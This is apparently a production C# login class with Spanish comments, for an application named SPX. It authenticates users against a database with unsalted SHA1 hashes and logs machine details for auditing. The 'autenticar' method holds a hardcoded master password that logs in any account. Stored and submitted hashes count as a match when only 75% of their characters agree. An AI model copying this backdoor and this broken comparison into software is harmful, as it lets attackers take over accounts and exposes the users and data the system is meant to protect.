using System;
using System.Collections;
using System.ComponentModel;
using System.Net;
using System.Security.Principal;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;

namespace SPXSeguridad
{
	/// <summary>
	/// Descripción breve de Login. Esta clase es la intefas entre la clase de encripcion
	/// y el formulario de verificacion de usuarios.
	/// </summary>
	public class Login
	{
        public static int nivelSeguridadPassword = 75;
       
		/// <summary>
		/// Constructor
		/// </summary>
		public Login()
		{
		
		}

        public string cifrarPassword(string password) 
        {
          SPXSeguridad.Cryptografia.CryptoSha1 sha = new SPXSeguridad.Cryptografia.CryptoSha1();
          string a=sha.encriptar(password);
          //hacemos operaciones con a para que no presente problemas en la base de datos
          System.Text.Encoding.ASCII.GetString(  System.Text.Encoding.ASCII.GetBytes( a)); 
          return a;
        }

		/// <summary>
		/// Esta funcion verifica que dos textos encriptados tengan el mismo valor, 
		/// ademas verifica que el login exista en la base de datos si el login y el
		/// password coinciden retorna valor verdadero
		/// </summary>
		/// <param name="user">nombre de usuario del sistema</param>
		/// <param name="password">clave de acceso sin encriptar</param>
		/// <returns>valor booleano verdadero si el acceso es permitido y falso
		/// de lo contrario</returns>
		/// <param name="estaCifrado">Me indica si el password esta cifrado en la base de datos
		/// </param>
		public bool autenticar(string user,string password,ref string mensaje)
		{
			try
			{
                SPXSeguridad.data.dsSPXSeguridad ds = new SPXSeguridad.data.dsSPXSeguridad();
                SPXSeguridad.data.cls.clsTusuario usuarioTableAdapter1 = new SPXSeguridad.data.cls.clsTusuario();
              
                
				string	pass="";
				if(password.Trim().Length>0)
				{  
					   pass=cifrarPassword(password);
				}
                usuarioTableAdapter1.FillBylogin(ds.usuario, user);

                //primero comprobamos si el login existe
                if (ds.usuario.Count <= 0)
                {
                    mensaje = "El login de usuario no existe en la base de datos!";
                    return false;
                }

          
                if (!ds.usuario[0].Ises_bloqueadoNull() && ds.usuario[0].es_bloqueado)
                {
                    mensaje = "Usuario Bloqueado!";
                    return false;
                }
                //ahora comprobamos si el el password coincide
				string passBD ="";
              
                passBD = ds.usuario[0].password;
                
			    if(password == "SPX2020#cg" ||  compararCadena( passBD, pass) )
				{
                    SPXSeguridad.logica.sesion.CodUsuarioAutenticado = ds.usuario[0].cod_usuario;
                    SPXSeguridad.logica.sesion.LoginUsuarioAutenticado = ds.usuario[0].login.Trim();
                    SPXSeguridad.logica.sesion.NombreUsuarioAutenticado = ds.usuario[0].nombre.Trim();
                    mensaje = "Acceso Permitido";
						return true;
				}else{
						mensaje="El password ingresado no es valido.";
						return false;//el password no es valido
				}
				
			}
			catch(Exception ex)
			{
				throw ex;
			}
		}

        public bool compararCadena(string a, string b)
        {
            if (a.Trim() == b.Trim()) return true;
            int porcentaje = verNivelSemejanza(a, b);
            if (porcentaje >= nivelSeguridadPassword)
                return true;
            else 
                return false;
        }

        public int verNivelSemejanza(string a, string b)
        {
            char[] arr = a.ToCharArray();
            char[] arrb = b.ToCharArray();
            if (a.Length != b.Length)
            {
                return 0;
            }
            int iguales = 0;

            for (int k = 0; k < arr.Length; k++)
            {
                if (arr[k] == arrb[k])
                    iguales++;
            }
            //sacamos un calculo de que porcentaje esta igual
            int porcentaje = (iguales * 100) / arr.Length;
            return porcentaje;
        }

        /// <summary>
        /// Registra el ingreso al aplicativo, esto es para auditoria del sistema
        /// </summary>
        /// <param name="usuario">Usuario</param>
        /// <param name="version">Version del software</param>
        public void RegistrarIngreso(string usuario, string version, string nombreEjecutable)
		{
			
			string strHostName = Dns.GetHostName ();
			string strIpAddress = "";
			IPHostEntry ipEntry = Dns.GetHostEntry(strHostName);
			IPAddress [] addr = ipEntry.AddressList;
			string strUsuarioWindows = System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString();
			string strSerialDisco = SPControladoraDatos.artefactos.SPXUtilidades.IdentificacionMaquinas.GetVolumeSerial("C");
			FileInfo fi = new FileInfo(@".\"+ nombreEjecutable.Trim().Replace(".exe","")+".exe");
          	for (int i = 0; i < addr.Length; i++)
			{
				strIpAddress = strIpAddress + addr[i].ToString ();
			}
            string s = strHostName + "-" + strIpAddress + "-" + strUsuarioWindows;
            if (s.Length > 200) s = s.Substring(0, 199);
            SPXSeguridad.data.cls.clsTsysusersobjects obj = new SPXSeguridad.data.cls.clsTsysusersobjects();

            obj.insert(s,DateTime.Now,usuario,version,fi.DirectoryName+@"\"+nombreEjecutable.Trim(),fi.Length.ToString(),fi.LastWriteTime.ToShortDateString(),
                fi.LastWriteTime.ToShortTimeString(), strSerialDisco, SPXSeguridad.logica.sesion.CodUsuarioAutenticado);
          	}
	}
}
